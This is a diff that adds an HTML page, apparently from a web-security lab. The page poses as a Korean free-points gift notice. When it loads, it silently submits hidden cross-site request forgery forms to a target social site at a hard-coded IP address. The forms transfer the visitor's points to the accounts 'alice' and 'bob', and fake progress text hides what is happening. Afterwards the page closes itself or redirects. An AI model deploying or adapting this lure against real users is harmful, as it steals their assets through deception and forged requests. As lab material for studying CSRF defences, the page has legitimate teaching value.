@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 무료 포인트 받기!</title>
+    <meta charset="utf-8">
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+        }
+        .gift-box {
+            background: white;
+            color: #333;
+            padding: 50px;
+            border-radius: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        h1 {
+            color: #667eea;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        .gift-icon {
+            font-size: 100px;
+            animation: bounce 1s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        #status {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            color: #667eea;
+            font-weight: bold;
+            min-height: 60px;
+        }
+        .success {
+            display: none;
+            color: #28a745;
+            font-size: 1.5em;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="gift-box">
+        <div class="gift-icon">🎁</div>
+        <h1>🎉 축하합니다!</h1>
+        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
+        <div id="status">포인트 전송 중...</div>
+        <div class="success" id="success">✅ 완료!</div>
+    </div>
+
+    <div id="csrfForms"></div>
+
+    <script>
+        // 설정값 (auto.py에서 자동으로 업데이트됨)
+        const TARGET_SNS = 'http://52.78.221.104';
+
+        console.log('[+] CSRF Attack Starting...');
+        console.log('[+] Target:', TARGET_SNS);
+
+        // 페이지 로드 즉시 실행
+        (function() {
+            const amounts = [5000, 3000, 2000, 1000, 500, 300, 100];
+            const receivers = [
+                {id: 2, name: 'alice'},
+                {id: 3, name: 'bob'}
+            ];
+
+            let formHTML = '';
+            let formIndex = 0;
+
+            // 폼 생성
+            amounts.forEach((amount) => {
+                receivers.forEach((receiver) => {
+                    formHTML += `
+                        <form id="csrfForm${formIndex}" method="POST" action="${TARGET_SNS}/profile.php" style="display:none" target="iframe${formIndex}">
+                            <input type="hidden" name="send_gift" value="1">
+                            <input type="hidden" name="receiver_id" value="${receiver.id}">
+                            <input type="hidden" name="gift_type" value="diamond">
+                            <input type="hidden" name="points" value="${amount}">
+                            <input type="hidden" name="message" value="Free Event Gift!">
+                        </form>
+                        <iframe id="iframe${formIndex}" name="iframe${formIndex}" style="display:none"></iframe>
+                    `;
+                    formIndex++;
+                });
+            });
+
+            document.getElementById('csrfForms').innerHTML = formHTML;
+
+            // 폼 순차 제출
+            const totalForms = formIndex;
+            for (let i = 0; i < totalForms; i++) {
+                setTimeout(() => {
+                    const form = document.getElementById('csrfForm' + i);
+                    if (form) {
+                        form.submit();
+                        const amountIndex = Math.floor(i / receivers.length);
+                        const receiverIndex = i % receivers.length;
+                        console.log(`[+] Sending ${amounts[amountIndex]}P to ${receivers[receiverIndex].name}`);
+
+                        document.getElementById('status').innerHTML =
+                            `전송 중: ${amounts[amountIndex]}P → ${receivers[receiverIndex].name} (${i+1}/${totalForms})`;
+                    }
+                }, i * 300);
+            }
+
+            // 완료 후 창 닫기
+            setTimeout(() => {
+                document.getElementById('success').style.display = 'block';
+                document.getElementById('status').innerHTML = '✅ 완료! 창이 닫힙니다...';
+
+                console.log('[+] All CSRF attempts completed');
+                console.log('[+] Total forms submitted:', totalForms);
+
+                // 1초 후 창 닫기
+                setTimeout(() => {
+                    window.close();
+                    // 창 닫기 실패 시 리다이렉트
+                    setTimeout(() => {
+                        window.location.href = TARGET_SNS + '/index.php';
+                    }, 500);
+                }, 1000);
+            }, totalForms * 300 + 1000);
+        })();
+    </script>
+</body>
+</html>
